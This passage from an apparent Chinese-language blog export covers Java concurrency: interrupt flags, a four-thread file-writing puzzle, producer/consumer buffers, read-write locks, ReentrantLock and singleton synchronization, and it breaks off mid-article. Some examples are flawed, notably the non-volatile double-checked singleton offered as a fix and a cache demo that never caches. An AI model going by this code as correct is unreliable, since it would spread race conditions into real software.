<h2 id="中断介绍"><a href="#中断介绍" class="headerlink" title="中断介绍"></a>中断介绍</h2><p>中断（Interrupt）一个线程意味着在该线程完成任务之前停止其正在进行的一切，有效地中止其当前的操作。线程是死亡、还是等待新的任务或是继续运行至下一步，就取决于这个程序。虽然初次看来它可能显得简单，但是，你必须进行一些预警以实现期望的结果。</p>
<p>从上面的介绍知道，interrupt()并不会使线程停止运行，那如何停止线程呢？</p>
<p>中断线程最好的，最受推荐的方式是，使用共享变量（shared<br>variable）发出信号，告诉线程必须停止正在运行的任务。线程必须周期性的核查这一变量（尤其在冗余操作期间），然后有秩序地中止任务。</p>
<pre><code>class Example2 extends Thread &#123;
    volatile boolean stop = false;

    public static void main(String args[]) throws Exception &#123;
        Example2 thread = new Example2();
        System.out.println(&quot;Starting thread...&quot;);
        thread.start();
        Thread.sleep(3000);
        System.out.println(&quot;Asking thread to stop...&quot;);

        thread.stop = true;
        Thread.sleep(3000);
        System.out.println(&quot;Stopping application...&quot;);
        //System.exit( 0 );
    &#125;

    public void run() &#123;
        while (!stop) &#123;
            System.out.println(&quot;Thread is running...&quot;);
            long time = System.currentTimeMillis();
            while ((System.currentTimeMillis() - time &lt; 1000) &amp;&amp; (!stop)) &#123;
            &#125;
        &#125;
        System.out.println(&quot;Thread exiting under request...&quot;);
    &#125;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>线程安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>线程安全</tag>
      </tags>
  </entry>
  <entry>
    <title>疑似Google多线程面试题的Java实现</title>
    <url>/blog/plang/java/threadsafe/mstgoogle/</url>
    <content><![CDATA[<p>疑似Google的多线程面试题:</p>
<p>启动4个线程，向4个文件A，B，C，D里写入数据，每个线程只能写一个值。</p>
<p>线程1：只写1</p>
<p>线程2：只写2</p>
<p>线程3：只写3</p>
<p>线程4：只写4</p>
<p>程序运行起来，4个文件的写入结果如下：</p>
<p>A：12341234...</p>
<p>B：23412341...</p>
<p>C：34123412...</p>
<p>D：41234123...</p>
<p>自己写了一下，代码如下：</p>
<pre><code>/**
 * ThreadTest
 * @author douzh
 * @version 1.0
 */
public class FileWriter &#123;
    static FileWrapper[] arrFile = &#123; new FileWrapper(1), new FileWrapper(2),
            new FileWrapper(3), new FileWrapper(4) &#125;;

    public static void main(String[] args) throws InterruptedException &#123;
        Writer t1=new Writer(1,1, arrFile);
        Writer t2=new Writer(2,2, arrFile);
        Writer t3=new Writer(3,3, arrFile);
        Writer t4=new Writer(4,4, arrFile);
        t1.start();
        t2.start();
        t3.start();
        t4.start();
        Thread.sleep(100);
        for (int i = 0; i &lt; arrFile.length; i++) &#123;
            System.out.println(arrFile[i].toString());
        &#125;
        t1.stop=true;
        t2.stop=true;
        t3.stop=true;
        t4.stop=true;
    &#125;
&#125;

class FileWrapper &#123;
    /**一个门*/
    public volatile int door = -1;
    /**模拟文件 */
    private StringBuilder file = new StringBuilder();

    public FileWrapper(int door) &#123;
        this.door = door;
    &#125;

    public void write(int i) &#123;
        file.append(i);
        door=door==4?1:++door;
    &#125;
    public String toString()&#123;
        return file.toString();
    &#125;
&#125;

class Writer extends Thread &#123;
    /**控制线程停止*/
    public volatile boolean stop=false;
    /**线程能进的门*/
    private int door=-1;
    /**线程要写的内容*/
    private int content = 0;
    /**文件列表*/
    FileWrapper[] arrFile = null;

    public Writer(int i,int door, FileWrapper[] arrFile) &#123;
        this.content = i;
        this.door=door;
        this.arrFile = arrFile;
    &#125;
    @Override
    public void run() &#123;
        while(!stop)&#123;
            try &#123;
                for (int i = 0; i &lt; arrFile.length; i++) &#123;
                    if (arrFile[i].door != door) &#123;
                        continue;
                    &#125;
                    arrFile[i].write(content);
                &#125;
            &#125; catch (Exception e) &#123;
                continue;
            &#125;
        &#125;
        System.out.println(Thread.currentThread().getName()+&quot;stop&quot;);
    &#125;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>线程安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>线程安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA实现生产者/消费者问题的多种方式</title>
    <url>/blog/plang/java/threadsafe/pcp/</url>
    <content><![CDATA[<p>生产者消费者问题是研究多线程程序时绕不开的经典问题之一，它描述是有一块缓冲区作为仓库，生产者可以将产品放入仓库，消费者则可以从仓库中取走产品。</p>
<p>常用同步方式有三种：</p>
<p>（1）wait() &#x2F; notify()方法</p>
<p>（2）await() &#x2F; signal()方法</p>
<p>（3）BlockingQueue阻塞队列方法</p>
<p>在示例中只有仓库代码是不同的，其它都是公用的。</p>
<h4 id="生产者"><a href="#生产者" class="headerlink" title="生产者"></a>生产者</h4><pre><code>/**
 * 生产者类Producer继承线程类Thread
 * 
 */
public class Producer extends Thread
&#123;
    // 每次生产的产品数量
    private int num;

    // 所在放置的仓库
    private Storage storage;

    // 构造函数，设置仓库
    public Producer(Storage storage)
    &#123;
        this.storage = storage;
    &#125;

    // 线程run函数
    public void run()
    &#123;
        produce(num);
    &#125;

    // 调用仓库Storage的生产函数
    public void produce(int num)
    &#123;
        storage.produce(num);
    &#125;

    // get/set方法
    public int getNum()
    &#123;
        return num;
    &#125;

    public void setNum(int num)
    &#123;
        this.num = num;
    &#125;

    public Storage getStorage()
    &#123;
        return storage;
    &#125;

    public void setStorage(Storage storage)
    &#123;
        this.storage = storage;
    &#125;
&#125;
</code></pre>
<h4 id="消费者"><a href="#消费者" class="headerlink" title="消费者"></a>消费者</h4><pre><code>/**
 * 消费者类Consumer继承线程类Thread
 * 
 */
public class Consumer extends Thread
&#123;
    // 每次消费的产品数量
    private int num;

    // 所在放置的仓库
    private Storage storage;

    // 构造函数，设置仓库
    public Consumer(Storage storage)
    &#123;
        this.storage = storage;
    &#125;

    // 线程run函数
    public void run()
    &#123;
        consume(num);
    &#125;

    // 调用仓库Storage的生产函数
    public void consume(int num)
    &#123;
        storage.consume(num);
    &#125;

    // get/set方法
    public int getNum()
    &#123;
        return num;
    &#125;

    public void setNum(int num)
    &#123;
        this.num = num;
    &#125;

    public Storage getStorage()
    &#123;
        return storage;
    &#125;

    public void setStorage(Storage storage)
    &#123;
        this.storage = storage;
    &#125;
&#125;
</code></pre>
<h4 id="测试类"><a href="#测试类" class="headerlink" title="测试类"></a>测试类</h4><pre><code>/**
 * 测试类Test
 * 
 */
public class Test
&#123;
    public static void main(String[] args)
    &#123;
        // 仓库对象
        Storage storage = new Storage();

        // 生产者对象
        Producer p1 = new Producer(storage);
        Producer p2 = new Producer(storage);
        Producer p3 = new Producer(storage);
        Producer p4 = new Producer(storage);
        Producer p5 = new Producer(storage);
        Producer p6 = new Producer(storage);
        Producer p7 = new Producer(storage);

        // 消费者对象
        Consumer c1 = new Consumer(storage);
        Consumer c2 = new Consumer(storage);
        Consumer c3 = new Consumer(storage);

        // 设置生产者产品生产数量
        p1.setNum(10);
        p2.setNum(10);
        p3.setNum(10);
        p4.setNum(10);
        p5.setNum(10);
        p6.setNum(10);
        p7.setNum(80);

        // 设置消费者产品消费数量
        c1.setNum(50);
        c2.setNum(20);
        c3.setNum(30);

        // 线程开始执行
        c1.start();
        c2.start();
        c3.start();
        p1.start();
        p2.start();
        p3.start();
        p4.start();
        p5.start();
        p6.start();
        p7.start();
    &#125;
&#125;
</code></pre>
<p>下面是仓库类的各种实现</p>
<h4 id="一、wait-x2F-notify-方法"><a href="#一、wait-x2F-notify-方法" class="headerlink" title="一、wait() &#x2F; notify()方法"></a>一、wait() &#x2F; notify()方法</h4><pre><code>/**
 * 仓库类Storage实现缓冲区
 * 
 */
public class Storage
&#123;
    // 仓库最大存储量
    private final int MAX_SIZE = 100;

    // 仓库存储的载体
    private LinkedList&lt; Object&gt; list = new LinkedList&lt; Object&gt;();

    // 生产num个产品
    public void produce(int num)
    &#123;
        // 同步代码段
        synchronized (list)
        &#123;
            // 如果仓库剩余容量不足
            while (list.size() + num &gt; MAX_SIZE)
            &#123;
                System.out.println(&quot;【要生产的产品数量】:&quot; + num + &quot;/t【库存量】:&quot;
                        + list.size() + &quot;/t暂时不能执行生产任务!&quot;);
                try
                &#123;
                    // 由于条件不满足，生产阻塞
                    list.wait();
                &#125;
                catch (InterruptedException e)
                &#123;
                    e.printStackTrace();
                &#125;
            &#125;

            // 生产条件满足情况下，生产num个产品
            for (int i = 1; i &lt;= num; ++i)
            &#123;
                list.add(new Object());
            &#125;

            System.out.println(&quot;【已经生产产品数】:&quot; + num + &quot;/t【现仓储量为】:&quot; + list.size());

            list.notifyAll();
        &#125;
    &#125;

    // 消费num个产品
    public void consume(int num)
    &#123;
        // 同步代码段
        synchronized (list)
        &#123;
            // 如果仓库存储量不足
            while (list.size() &lt; num)
            &#123;
                System.out.println(&quot;【要消费的产品数量】:&quot; + num + &quot;/t【库存量】:&quot;
                        + list.size() + &quot;/t暂时不能执行生产任务!&quot;);
                try
                &#123;
                    // 由于条件不满足，消费阻塞
                    list.wait();
                &#125;
                catch (InterruptedException e)
                &#123;
                    e.printStackTrace();
                &#125;
            &#125;

            // 消费条件满足情况下，消费num个产品
            for (int i = 1; i &lt;= num; ++i)
            &#123;
                list.remove();
            &#125;

            System.out.println(&quot;【已经消费产品数】:&quot; + num + &quot;/t【现仓储量为】:&quot; + list.size());

            list.notifyAll();
        &#125;
    &#125;

    // get/set方法
    public LinkedList&lt; Object&gt; getList()
    &#123;
        return list;
    &#125;

    public void setList(LinkedList&lt; Object&gt; list)
    &#123;
        this.list = list;
    &#125;

    public int getMAX_SIZE()
    &#123;
        return MAX_SIZE;
    &#125;
&#125;
</code></pre>
<h4 id="二、await-x2F-signal-方法"><a href="#二、await-x2F-signal-方法" class="headerlink" title="二、await() &#x2F; signal()方法"></a>二、await() &#x2F; signal()方法</h4><pre><code>/**
 * 仓库类Storage实现缓冲区
 * 
 * Email:530025983@qq.com
 * 
 * @author MONKEY.D.MENG 2011-03-15
 * 
 */
public class Storage
&#123;
    // 仓库最大存储量
    private final int MAX_SIZE = 100;

    // 仓库存储的载体
    private LinkedList&lt; Object&gt; list = new LinkedList&lt; Object&gt;();

    // 锁
    private final Lock lock = new ReentrantLock();

    // 仓库满的条件变量
    private final Condition full = lock.newCondition();

    // 仓库空的条件变量
    private final Condition empty = lock.newCondition();

    // 生产num个产品
    public void produce(int num)
    &#123;
        // 获得锁
        lock.lock();

        // 如果仓库剩余容量不足
        while (list.size() + num &gt; MAX_SIZE)
        &#123;
            System.out.println(&quot;【要生产的产品数量】:&quot; + num + &quot;/t【库存量】:&quot; + list.size()
                    + &quot;/t暂时不能执行生产任务!&quot;);
            try
            &#123;
                // 由于条件不满足，生产阻塞
                full.await();
            &#125;
            catch (InterruptedException e)
            &#123;
                e.printStackTrace();
            &#125;
        &#125;

        // 生产条件满足情况下，生产num个产品
        for (int i = 1; i &lt;= num; ++i)
        &#123;
            list.add(new Object());
        &#125;

        System.out.println(&quot;【已经生产产品数】:&quot; + num + &quot;/t【现仓储量为】:&quot; + list.size());

        // 唤醒其他所有线程
        full.signalAll();
        empty.signalAll();

        // 释放锁
        lock.unlock();
    &#125;

    // 消费num个产品
    public void consume(int num)
    &#123;
        // 获得锁
        lock.lock();

        // 如果仓库存储量不足
        while (list.size() &lt; num)
        &#123;
            System.out.println(&quot;【要消费的产品数量】:&quot; + num + &quot;/t【库存量】:&quot; + list.size()
                    + &quot;/t暂时不能执行生产任务!&quot;);
            try
            &#123;
                // 由于条件不满足，消费阻塞
                empty.await();
            &#125;
            catch (InterruptedException e)
            &#123;
                e.printStackTrace();
            &#125;
        &#125;

        // 消费条件满足情况下，消费num个产品
        for (int i = 1; i &lt;= num; ++i)
        &#123;
            list.remove();
        &#125;

        System.out.println(&quot;【已经消费产品数】:&quot; + num + &quot;/t【现仓储量为】:&quot; + list.size());

        // 唤醒其他所有线程
        full.signalAll();
        empty.signalAll();

        // 释放锁
        lock.unlock();
    &#125;

    // set/get方法
    public int getMAX_SIZE()
    &#123;
        return MAX_SIZE;
    &#125;

    public LinkedList&lt; Object&gt; getList()
    &#123;
        return list;
    &#125;

    public void setList(LinkedList&lt; Object&gt; list)
    &#123;
        this.list = list;
    &#125;
&#125;
</code></pre>
<h4 id="三、BlockingQueue阻塞队列方法"><a href="#三、BlockingQueue阻塞队列方法" class="headerlink" title="三、BlockingQueue阻塞队列方法"></a>三、BlockingQueue阻塞队列方法</h4><pre><code>/**
 * 仓库类Storage实现缓冲区
 * 
 */
public class Storage
&#123;
    // 仓库最大存储量
    private final int MAX_SIZE = 100;

    // 仓库存储的载体
    private LinkedBlockingQueue&lt; Object&gt; list = new LinkedBlockingQueue&lt; Object&gt;(
            100);

    // 生产num个产品
    public void produce(int num)
    &#123;
        // 如果仓库剩余容量为0
        if (list.size() == MAX_SIZE)
        &#123;
            System.out.println(&quot;【库存量】:&quot; + MAX_SIZE + &quot;/t暂时不能执行生产任务!&quot;);
        &#125;

        // 生产条件满足情况下，生产num个产品
        for (int i = 1; i &lt;= num; ++i)
        &#123;
            try
            &#123;
                // 放入产品，自动阻塞
                list.put(new Object());
            &#125;
            catch (InterruptedException e)
            &#123;
                e.printStackTrace();
            &#125;

            System.out.println(&quot;【现仓储量为】:&quot; + list.size());
        &#125;
    &#125;

    // 消费num个产品
    public void consume(int num)
    &#123;
        // 如果仓库存储量不足
        if (list.size() == 0)
        &#123;
            System.out.println(&quot;【库存量】:0/t暂时不能执行生产任务!&quot;);
        &#125;

        // 消费条件满足情况下，消费num个产品
        for (int i = 1; i &lt;= num; ++i)
        &#123;
            try
            &#123;
                // 消费产品，自动阻塞
                list.take();
            &#125;
            catch (InterruptedException e)
            &#123;
                e.printStackTrace();
            &#125;
        &#125;

        System.out.println(&quot;【现仓储量为】:&quot; + list.size());
    &#125;

    // set/get方法
    public LinkedBlockingQueue&lt; Object&gt; getList()
    &#123;
        return list;
    &#125;

    public void setList(LinkedBlockingQueue&lt; Object&gt; list)
    &#123;
        this.list = list;
    &#125;

    public int getMAX_SIZE()
    &#123;
        return MAX_SIZE;
    &#125;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>线程安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>线程安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA同步之ReentrantReadWriteLock</title>
    <url>/blog/plang/java/threadsafe/readwritelock/</url>
    <content><![CDATA[<p>读写锁：分为读锁和写锁，多个读锁不互斥，读锁与写锁互斥，这是由jvm自己控制的，你只要上好相应的锁即可。如果你的代码只读数据，可以很多人同时读，但不能同时写，那就上读锁；如果你的代码修改数据，只能有一个人在写，且不能同时读取，那就上写锁。总之，读的时候上读锁，写的时候上写锁！</p>
<p>ReentrantReadWriteLock会使用两把锁来解决问题，一个读锁，一个写锁</p>
<p>线程进入读锁的前提条件：</p>
<p>没有其他线程的写锁，</p>
<p>没有写请求或者有写请求，但调用线程和持有锁的线程是同一个</p>
<p>线程进入写锁的前提条件：</p>
<p>没有其他线程的读锁</p>
<p>没有其他线程的写锁</p>
<p>ReentrantReadWriteLock锁机制的特性:</p>
<p>(a).重入方面其内部的WriteLock可以获取ReadLock，但是反过来ReadLock想要获得WriteLock则永远都不要想。</p>
<p>(b).WriteLock可以降级为ReadLock，顺序是：先获得WriteLock再获得ReadLock，然后释放WriteLock，这时候线程将保持Readlock的持有。反过来ReadLock想要升级为WriteLock则不可能，为什么？参看(a)</p>
<p>(c).ReadLock可以被多个线程持有并且在作用时排斥任何的WriteLock，而WriteLock则是完全的互斥。这一特性最为重要，因为对于高读取频率而相对较低写入的数据结构，使用此类锁同步机制则可以提高并发量。</p>
<p>(d).不管是ReadLock还是WriteLock都支持Interrupt，语义与ReentrantLock一致。</p>
<p>(e).WriteLock支持Condition并且与ReentrantLock语义一致，而ReadLock则不能使用Condition，否则抛出UnsupportedOperationException异常。</p>
<p>例子1：</p>
<pre><code>package com.thread;

import java.util.Random;
import java.util.concurrent.locks.ReentrantReadWriteLock;

public class ReadWriteLockTest &#123;
    public static void main(String[] args) &#123;
        final Queue3 q3 = new Queue3();
        for(int i=0;i&lt;3;i++)
        &#123;
            new Thread()&#123;
                public void run()&#123;
                    while(true)&#123;
                        q3.get();
                    &#125;
                &#125;

            &#125;.start();
        &#125;
        for(int i=0;i&lt;3;i++)
        &#123;
            new Thread()&#123;
                public void run()&#123;
                    while(true)&#123;
                        q3.put(new Random().nextInt(10000));
                    &#125;
                &#125;

            &#125;.start();
        &#125;
    &#125;
&#125;

class Queue3&#123;
    private Object data = null;//共享数据，只能有一个线程能写该数据，但可以有多个线程同时读该数据。
    private ReentrantReadWriteLock rwl = new ReentrantReadWriteLock();
    public void get()&#123;
        rwl.readLock().lock();//上读锁，其他线程只能读不能写
        System.out.println(Thread.currentThread().getName() + &quot; be ready to read data!&quot;);
        try &#123;
            Thread.sleep((long)(Math.random()*1000));
        &#125; catch (InterruptedException e) &#123;
            e.printStackTrace();
        &#125;
        System.out.println(Thread.currentThread().getName() + &quot;have read data :&quot; + data);
        rwl.readLock().unlock(); //释放读锁，最好放在finnaly里面
    &#125;

    public void put(Object data)&#123;

        rwl.writeLock().lock();//上写锁，不允许其他线程读也不允许写
        System.out.println(Thread.currentThread().getName() + &quot; be ready to write data!&quot;);
        try &#123;
            Thread.sleep((long)(Math.random()*1000));
        &#125; catch (InterruptedException e) &#123;
            e.printStackTrace();
        &#125;
        this.data = data;
        System.out.println(Thread.currentThread().getName() + &quot; have write data: &quot; + data);

        rwl.writeLock().unlock();//释放写锁    
    &#125;
&#125;
</code></pre>
<p>下面使用读写锁模拟一个缓存器：</p>
<pre><code>package com.thread;

import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.locks.ReadWriteLock;
import java.util.concurrent.locks.ReentrantReadWriteLock;

public class CacheDemo &#123;
    private Map&lt; String,Object&gt; map = new HashMap&lt; String,Object&gt;();//缓存器
    private ReadWriteLock rwl = new ReentrantReadWriteLock();

    public Object get(String id)&#123;
        Object value = null;
        rwl.readLock().lock();//首先开启读锁，从缓存中去取
        try&#123;
            value = map.get(id); 
            if(value == null)&#123;  //如果缓存中没有释放读锁，上写锁
                rwl.readLock().unlock();
                rwl.writeLock().lock();
                try&#123;
                    if(value == null)&#123;
                        value = &quot;aaa&quot;;  //此时可以去数据库中查找，这里简单的模拟一下
                    &#125;
                &#125;finally&#123;
                    rwl.writeLock().unlock(); //释放写锁
                &#125;
                rwl.readLock().lock(); //然后再上读锁
            &#125;
        &#125;finally&#123;
            rwl.readLock().unlock(); //最后释放读锁
        &#125;
        return value;
    &#125;

&#125;
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>线程安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>线程安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA同步之ReentrantLock 类简介</title>
    <url>/blog/plang/java/threadsafe/reentrantlock/</url>
    <content><![CDATA[<h2 id="ReentrantLock-类"><a href="#ReentrantLock-类" class="headerlink" title="ReentrantLock 类"></a>ReentrantLock 类</h2><p>java.util.concurrent.lock 中的 Lock框架是锁定的一个抽象，它允许把锁定的实现作为 Java类，而不是作为语言的特性来实现。这就为 Lock的多种实现留下了空间，各种实现可能有不同的调度算法、性能特性或者锁定语义。</p>
<p>ReentrantLock 类实现了 Lock ，它拥有与 synchronized相同的并发性和内存语义，但是添加了类似锁投票、定时锁等候和可中断锁等候的一些特性。此外，它还提供了在激烈争用情况下更佳的性能。（换句话说，当许多线程都想访问共享资源时，JVM可以花更少的时候来调度线程，把更多时间用在执行线程上。）</p>
<p>reentrant锁意味着什么呢？简单来说，它有一个与锁相关的获取计数器，如果拥有锁的某个线程再次得到锁，那么获取计数器就加1，然后锁需要被释放两次才能获得真正释放。这模仿了synchronized 的语义；如果线程进入由线程已经拥有的监控器保护的synchronized 块，就允许线程继续进行，当线程退出第二个（或者后续）<br>synchronized 块的时候，不释放锁，只有线程退出它进入的监控器保护的第一个synchronized 块时，才释放锁。</p>
<p>Lock 和 synchronized 有一点明显的区别 —— lock 必须在 finally块中释放。否则，如果受保护的代码将抛出异常，锁就有可能永远得不到释放！这一点区别看起来可能没什么，但是实际上，它极为重要。忘记在finally<br>块中释放锁，可能会在程序中留下一个定时炸弹，当有一天炸弹爆炸时，您要花费很大力气才有找到源头在哪。而使用同步，JVM将确保锁会获得自动释放。</p>
<pre><code>Lock lock = new ReentrantLock();
lock.lock();
try &#123; 
  // update object state
&#125;
finally &#123;
  lock.unlock(); 
&#125;
</code></pre>
<p>除此之外，与目前的 synchronized 实现相比，争用下的 ReentrantLock实现更具可伸缩性。（在未来的 JVM 版本中，synchronized的争用性能很有可能会获得提高。）这意味着当许多线程都在争用同一个锁时，使用<br>ReentrantLock 的总体开支通常要比 synchronized 少得多。</p>
<p>根类 Object 包含某些特殊的方法，用来在线程的 wait() 、 notify() 和notifyAll() 之间进行通信。</p>
<p>通知与锁定之间有一个交互 —— 为了在对象上 wait 或 notify，您必须持有该对象的锁。就像 Lock 是同步的概括一样， Lock 框架包含了对wait 和 notify 的概括，这个概括叫作 条件（Condition） 。 Lock对象则充当绑定到这个锁的条件变量的工厂对象，与标准的 wait 和 notify方法不同，对于指定的 Lock，可以有不止一个条件变量与它关联。这样就简化了许多并发算法的开发。例如，条件（Condition） 的 Javadoc显示了一个有界缓冲区实现的示例，该示例使用了两个条件变量，“notfull”和“not empty”，它比每个 lock 只用一个 wait设置的实现方式可读性要好一些（而且更有效）。 Condition 的方法与 wait 、notify 和 notifyAll 方法类似，分别命名为 await 、 signal 和 signalAll，因为它们不能覆盖 Object 上的对应方法。</p>
<h2 id="不要抛弃-synchronized"><a href="#不要抛弃-synchronized" class="headerlink" title="不要抛弃 synchronized"></a>不要抛弃 synchronized</h2><p>虽然 ReentrantLock 是个非常动人的实现，相对 synchronized来说，它有一些重要的优势，但是我认为急于把 synchronized视若敝屣，绝对是个严重的错误。 java.util.concurrent.lock中的锁定类是用于高级用户和高级情况的工具 。一般来说，除非您对 Lock的某个高级特性有明确的需要，或者有明确的证据（而不是仅仅是怀疑）表明在特定情况下，同步已经成为可伸缩性的瓶颈，否则还是应当继续使用synchronized。</p>
<p>为什么我在一个显然“更好的”实现的使用上主张保守呢？因为对于java.util.concurrent.lock 中的锁定类来说，synchronized仍然有一些优势。比如，在使用 synchronized 的时候，不能忘记释放锁；在退出synchronized 块时，JVM 会为您做这件事。您很容易忘记用 finally块释放锁，这对程序非常有害。您的程序能够通过测试，但会在实际工作中出现死锁，那时会很难指出原因（这也是为什么根本不让初级开发人员使用<br>Lock 的一个好理由。）</p>
<p>另一个原因是因为，当 JVM 用 synchronized 管理锁定请求和释放时，JVM在生成线程转储时能够包括锁定信息。这些对调试非常有价值，因为它们能标识死锁或者其他异常行为的来源。</p>
<p>Lock 类只是普通的类，JVM 不知道具体哪个线程拥有 Lock对象。而且，几乎每个开发人员都熟悉synchronized，它可以在 JVM的所有版本中工作。在 JDK 5.0成为标准（从现在开始可能需要两年）之前，使用 Lock类将意味着要利用的特性不是每个 JVM都有的，而且不是每个开发人员都熟悉的。</p>
<h2 id="什么时候选择用-ReentrantLock-代替-synchronized"><a href="#什么时候选择用-ReentrantLock-代替-synchronized" class="headerlink" title="什么时候选择用 ReentrantLock 代替 synchronized"></a>什么时候选择用 ReentrantLock 代替 synchronized</h2><p>既然如此，我们什么时候才应该使用 ReentrantLock 呢？答案非常简单 ——在确实需要一些 synchronized<br>所没有的特性的时候，比如时间锁等候、可中断锁等候、无块结构锁、多个条件变量或者锁投票。</p>
<p>ReentrantLock</p>
<p>还具有可伸缩性的好处，应当在高度争用的情况下使用它，但是请记住，大多数synchronized块几乎从来没有出现过争用，所以可以把高度争用放在一边。我建议用synchronized 开发，直到确实证明 synchronized不合适，而不要仅仅是假设如果使用 ReentrantLock“性能会更好”。请记住，这些是供高级用户使用的高级工具。（而且，真正的高级用户喜欢选择能够找到的最简单工具，直到他们认为简单的工具不适用为止。）。一如既往，首先要把事情做好，然后再考虑是不是有必要做得更快。</p>
<p>Lock 框架是同步的兼容替代品，它提供了 synchronized没有提供的许多特性，它的实现在争用下提供了更好的性能。但是，这些明显存在的好处，还不足以成为用ReentrantLock 代替 synchronized 的理由。相反，应当根据您是否 需要ReentrantLock 的能力来作出选择。大多数情况下，您不应当选择它 ——synchronized 工作得很好，可以在所有 JVM上工作，更多的开发人员了解它，而且不太容易出错。只有在真正需要 Lock的时候才用它。在这些情况下，您会很高兴拥有这款工具。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>线程安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>线程安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java单例对象同步问题</title>
    <url>/blog/plang/java/threadsafe/singletonsync/</url>
    <content><![CDATA[<p>单例对象（Singleton）是一种常用的设计模式。在Java应用中，单例对象能保证在一个JVM中，该对象只有一个实例存在。正是由于这个特点，单例对象通常作为程序中的存放配置信息的载体，因为它能保证其他对象读到一致的信息。例如在某个服务器程序中，该服务器的配置信息可能存放在数据库或文件中，这些配置数据由某个单例对象统一读取，服务进程中的其他对象如果要获取这些配置信息，只需访问该单例对象即可。这种方式极大地简化了在复杂环境下，尤其是多线程环境下的配置管理，但是随着应用场景的不同，也可能带来一些同步问题。</p>
<p>本文将探讨一下在多线程环境下，使用单例对象作配置信息管理时可能会带来的几个同步问题，并针对每个问题给出可选的解决办法。</p>
<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>在多线程环境下，单例对象的同步问题主要体现在两个方面，单例对象的初始化和单例对象的属性更新。</p>
<p>本文描述的方法有如下假设：</p>
<ol>
<li>单例对象的属性（或成员变量）的获取，是通过单例对象的初始化实现的。也就是说，在单例对象初始化时，会从文件或数据库中读取最新的配置信息。</li>
<li>其他对象不能直接改变单例对象的属性，单例对象属性的变化来源于配置文件或配置数据库数据的变化。</li>
</ol>
<h3 id="单例对象的初始化"><a href="#单例对象的初始化" class="headerlink" title="单例对象的初始化"></a>单例对象的初始化</h3><p>首先，讨论一下单例对象的初始化同步。单例模式的通常处理方式是，在对象中有一个静态成员变量，其类型就是单例类型本身；如果该变量为null，则创建该单例类型的对象，并将该变量指向这个对象；如果该变量不为null，则直接使用该变量。</p>
<p>其过程如下面代码所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class GlobalConfig &#123;</span><br><span class="line">  private static GlobalConfig instance = null;</span><br><span class="line">  private Vector properties = null;</span><br><span class="line">  private GlobalConfig() &#123;</span><br><span class="line">    //Load configuration information from DB or file</span><br><span class="line">    //Set values for properties</span><br><span class="line">  &#125;</span><br><span class="line">  public static GlobalConfig getInstance() &#123;</span><br><span class="line">    if (instance == null) &#123;</span><br><span class="line">      instance = new GlobalConfig();</span><br><span class="line">    &#125;</span><br><span class="line">    return instance;</span><br><span class="line">  &#125;</span><br><span class="line">  public Vector getProperties() &#123;</span><br><span class="line">    return properties;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种处理方式在单线程的模式下可以很好的运行；但是在多线程模式下，可能产生问题。如果第一个线程发现成员变量为null，准备创建对象；这是第二个线程同时也发现成员变量为null，也会创建新对象。这就会造成在一个JVM中有多个单例类型的实例。如果这个单例类型的成员变量在运行过程中变化，会造成多个单例类型实例的不一致，产生一些很奇怪的现象。例如，某服务进程通过检查单例对象的某个属性来停止多个线程服务，如果存在多个单例对象的实例，就会造成部分线程服务停止，部分线程服务不能停止的情况。</p>
<h3 id="单例对象的属性更新"><a href="#单例对象的属性更新" class="headerlink" title="单例对象的属性更新"></a>单例对象的属性更新</h3><p>通常，为了实现配置信息的实时更新，会有一个线程不停检测配置文件或配置数据库的内容，一旦发现变化，就更新到单例对象的属性中。在更新这些信息的时候，很可能还会有其他线程正在读取这些信息，造成意想不到的后果。还是以通过单例对象属性停止线程服务为例，如果更新属性时读写不同步，可能访问该属性时这个属性正好为空（null），程序就会抛出异常。</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title=" 解决方法"></a> 解决方法</h2><h3 id="单例对象的初始化同步"><a href="#单例对象的初始化同步" class="headerlink" title="单例对象的初始化同步"></a>单例对象的初始化同步</h3><p>对于初始化的同步，可以通过如下代码所采用的方式解决。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class GlobalConfig &#123;</span><br><span class="line">  private static GlobalConfig instance = null;</span><br><span class="line">  private Vector properties = null;</span><br><span class="line">  private GlobalConfig() &#123;</span><br><span class="line">    //Load configuration information from DB or file</span><br><span class="line">    //Set values for properties</span><br><span class="line">  &#125;</span><br><span class="line">  private static synchronized void syncInit() &#123;</span><br><span class="line">    if (instance == null) &#123;</span><br><span class="line">      instance = new GlobalConfig();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  public static GlobalConfig getInstance() &#123;</span><br><span class="line">    if (instance == null) &#123;</span><br><span class="line">      syncInit();</span><br><span class="line">    &#125;</span><br><span class="line">    return instance;</span><br><span class="line">  &#125;</span><br><span class="line">  public Vector getProperties() &#123;</span><br><span class="line">    return properties;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种处理方式虽然引入了同步代码，但是因为这段同步代码只会在最开始的时候执行一次或多次，所以对整个系统的性能不会有影响。</p>
<h3 id="单例对象的属性更新同步"><a href="#单例对象的属性更新同步" class="headerlink" title="单例对象的属性更新同步"></a>单例对象的属性更新同步</h3><p>为了解决第2个问题，有两种方法：</p>
